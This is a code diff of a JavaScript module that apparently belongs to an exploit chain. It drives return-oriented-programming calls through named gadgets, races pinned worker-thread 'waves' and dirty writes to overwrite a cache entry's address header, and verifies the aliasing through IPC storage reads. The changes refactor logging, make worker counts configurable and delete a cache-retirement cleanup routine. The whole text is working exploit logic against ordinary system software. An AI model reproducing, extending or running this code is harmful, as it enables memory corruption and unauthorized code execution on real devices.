@@ -1,6 +1,6 @@
 import coreRuntime, {waitMs} from "../runtime.mjs";
 import {readHexBytes} from "./util.mjs";
-import {emitVerboseStage} from "../log-stage.mjs";
+import {verboseLog} from "../logger.mjs";
 import {
   analyzeWave,
   configurePayload,
@@ -16,7 +16,6 @@ const {
   frameArgSlot,
   hex32,
   ipcStorageRead,
-  log,
   openReservationGroup,
   prepPacket,
   resetWaveState,
@@ -77,7 +76,6 @@ export async function installAddressHeader(input) {
     var steps;
     try { steps = nulWrites(padded); }
     catch (error) {
-        await log(stageName + " copy planning failed: " + error.message);
         return copyResult(false);
     }
     if (!steps.length) return copyResult(false);
@@ -90,14 +88,12 @@ export async function installAddressHeader(input) {
         var addrAttempts = 0;
         var acceptedResult = null;
         var addrWinFail = 0, addrPreLow = 0, addrPathMiss = 0;
-        for (var batch = 0; batch < config.COPY_BATCHES && !confirmed &&
-            !stoppedByUser && !shouldStop?.(); batch++) {
-        for (var attempt = 0; attempt < config.MAX_COPY_ATTEMPTS &&
+        for (var attempt = 0;
+            attempt < config.MAX_CACHE_WAVES_PER_STEP &&
             !stoppedByUser && !shouldStop?.(); attempt++) {
             addrAttempts++;
             if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                     dirtyWriteBuf, dirtyWritePkt)) {
-                await log(stageName + " copy failed: dirty write");
                 return copyResult(false);
             }
 
@@ -108,7 +104,6 @@ export async function installAddressHeader(input) {
             if (!payloadSetup.configured) return copyResult(false);
             var group = openReservationGroup(rootSession, pktBuf, 59);
             if (!group.ok) {
-                await log(stageName + " copy failed: reservation group");
                 return copyResult(false);
             }
 
@@ -125,21 +120,26 @@ export async function installAddressHeader(input) {
             write32(pinPkt + 0x18n, 1009n);
 
             var wave = executeWave(waveData.frames, rawScheduling,
-                workerResources, gates, sendIndices);
-            wavesStarted += wave.started === 13 ? 1 : 0;
-            if (wave.created < 13 || wave.started < 13) {
+                workerResources, gates, sendIndices,
+                config.workerRoles);
+            wavesStarted += wave.started === config.WORKER_COUNT
+                ? 1 : 0;
+
+            if (wave.created < config.WORKER_COUNT ||
+                wave.pinned < config.WORKER_COUNT ||
+                wave.started < config.WORKER_COUNT) {
+
                 var releaseCode = roleSendCode(waveData.frames, 9,
                     sendIndices[9]);
                 closeReservationGroup(group,
-                    wave.created < 13 || releaseCode !== 0, pktBuf);
+                    wave.created < config.WORKER_COUNT ||
+                        releaseCode !== 0, pktBuf);
                 workerStateSafe = wave.workerStateSafe === true;
-                await log(stageName + " copy failed: workers=" + wave.created +
-                    "/" + wave.started + " joined=" + wave.joined);
                 return copyResult(false);
             }
-            if (wave.joined < 13) {
+
+            if (wave.joined < config.WORKER_COUNT) {
                 workerStateSafe = false;
-                await log(stageName + " copy failed: workers did not join");
                 return copyResult(false);
             }
             wavesJoined++;
@@ -174,15 +174,14 @@ export async function installAddressHeader(input) {
             if (shouldStop?.()) stoppedByUser = true;
             if (confirmed || stoppedByUser) break;
         }
-        }
         if (stoppedByUser) {
-            await emitVerboseStage(stageName + " stopped during step " +
+            await verboseLog(stageName + " stopped during step " +
                 (stepIdx + 1) + "/" + steps.length + " after " +
                 addrAttempts + " waves.");
             return copyResult(false);
         }
         if (confirmed) {
-            await emitVerboseStage(stageName + " step " +
+            await verboseLog(stageName + " step " +
                 (stepIdx + 1) + "/" + steps.length + " accepted after " +
                 addrAttempts + " waves" +
                 (acceptedResult?.margin != null
@@ -191,25 +190,19 @@ export async function installAddressHeader(input) {
                     ? " · cache=0x" +
                       Number(acceptedResult.preReleaseUsed).toString(16) : "") +
                 ".");
-            await log("  " + stageName + " step " + stepIdx +
-                " OK (att=" + addrAttempts + ")");
             // Let the accepted wave and step summary reach the host before
             // starting another cache-address step or the verification reads.
         } else {
-            await emitVerboseStage(stageName + " step " +
+            await verboseLog(stageName + " step " +
                 (stepIdx + 1) + "/" + steps.length + " rejected after " +
                 addrAttempts + " waves: window=" + addrWinFail +
                 ", cache=" + addrPreLow + ", path=" + addrPathMiss + ".");
-            await log("  " + stageName + " step " + stepIdx + " FAIL att=" + addrAttempts +
-                " winFail=" + addrWinFail + " preLow=" + addrPreLow +
-                " pathMiss=" + addrPathMiss);
         }
         if (!confirmed) return copyResult(false);
     }
     if (shouldStop?.()) stoppedByUser = true;
     return copyResult(!stoppedByUser);
 }
-
 export async function qualifyCacheBucketPeriod(input) {
     let candidateHandle = input.candidateHandle;
     let primeHex = input.primeHex;
@@ -219,12 +212,7 @@ export async function qualifyCacheBucketPeriod(input) {
     var controlBuf = allocPage(0x1000);
     call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
     var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
-    var controlHex = control.error === 0 ? readHexBytes(controlBuf, 16) : "";
-    await log("PERIOD: ordinary @0x28000=" +
-        hex32(control.error) + (controlHex ? " data=" + controlHex : "") +
-        " matches-prefix=" + (controlHex === primeHex));
     if (control.error !== 0) {
-        await log("PERIOD: ordinary content control failed");
         return {ok: false, addressCopy};
     }
 
@@ -250,22 +238,15 @@ export async function qualifyCacheBucketPeriod(input) {
         var periodHex = periodRead.error === 0
             ? readHexBytes(periodBuf, 16) : "";
         periodAliasOk = periodRead.error === 0 && periodHex === primeHex;
-        await log("PERIOD: alias probe=" +
-            hex32(periodRead.error) + (periodHex ? " data=" + periodHex : "") +
-            " matched=" + periodAliasOk);
-    } else {
-        await log("PERIOD: offset-copy sequence did not qualify");
     }
 
     // Leave the candidate in this measured state. The next address-header
     // copy replaces all 0x28 bytes; if planning or copying fails, retirement
     // clears the valid byte before the handle can be closed.
-    await log("PERIOD: candidate state=" +
-        (periodAliasOk ? "measured alias" : "unqualified; retire only"));
     return {ok: periodAliasOk, addressCopy};
 }
 
-function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
+export function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
     if (!addressCopy || !addressCopy.config)
         return {state: "unavailable", error: null, detail: "address baseline unavailable"};
     var baseline = addressCopy.aliasControlHex;
@@ -292,62 +273,4 @@ function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
         return {state: "unavailable", error: null,
             detail: String(error?.message || error)};
     }
-}
-
-export async function retireCandidateCache(input) {
-    let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
-    let candidateCacheRetired = input.candidateCacheRetired;
-    let candidateHandle = input.candidateHandle;
-    let addressCopy = input.addressCopy;
-    if (!candidateHandle || !candidateCacheNeedsRetirement)
-        return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired},
-            retirementSkipped: false};
-
-    await log("RETIRE: begin; checking candidate alias before retirement waves");
-    var precheck = inspectCandidateCacheAlias(candidateHandle, addressCopy);
-    await log("RETIRE: precheck=" + precheck.state +
-        " read=" + (precheck.error == null ? "unavailable" : hex32(precheck.error)) +
-        (precheck.detail ? " detail=" + precheck.detail : ""));
-    if (precheck.state === "original") {
-        candidateCacheRetired = true;
-        addressCopy = {...addressCopy, candidateCacheRetired};
-        await emitVerboseStage("Candidate cache precheck=original · read=" +
-            hex32(precheck.error) + " · skipping retirement waves.");
-        await log("RETIRE: skipped; original content verified before retirement");
-        return {ok: true, addressCopy, candidateCacheRetired,
-            retirementSkipped: true};
-    }
-
-    await emitVerboseStage("Candidate cache precheck=" + precheck.state +
-        " · read=" + (precheck.error == null
-            ? "unavailable" : hex32(precheck.error)) +
-        (precheck.detail ? " · " + precheck.detail : "") +
-        " · running retirement waves.");
-    await log("RETIRE: clearing cache-entry valid byte");
-    var retireBytes = [];
-    for (var i = 0; i < 0x10; i++) retireBytes.push(0x42);
-    var retirement = await installAddressHeader({...addressCopy,
-        desiredBytes: retireBytes, stageName: "cache-retire"});
-    addressCopy = retirement.addressCopy;
-    var retired = retirement.ok;
-    var readback = null;
-    if (!retired && addressCopy.workerStateSafe === true) {
-        // A rejected timing window can still have cleared the valid byte.
-        // Only the candidate's original bytes prove that the alias is gone.
-        readback = inspectCandidateCacheAlias(candidateHandle, addressCopy);
-        retired = readback.state === "original";
-        await log("RETIRE: readback=" + readback.state +
-            " read=" + (readback.error == null
-                ? "unavailable" : hex32(readback.error)) +
-            (readback.detail ? " detail=" + readback.detail : "") +
-            " stillAliased=" + (readback.state === "aliased"));
-    }
-    if (retired) {
-        candidateCacheRetired = true;
-        addressCopy = {...addressCopy, candidateCacheRetired};
-    }
-    await log("RETIRE: " + (retirement.ok
-        ? "accepted" : retired ? "verified by readback" : "FAILED"));
-    return {ok: retired, addressCopy, candidateCacheRetired,
-        retirementSkipped: false};
 }
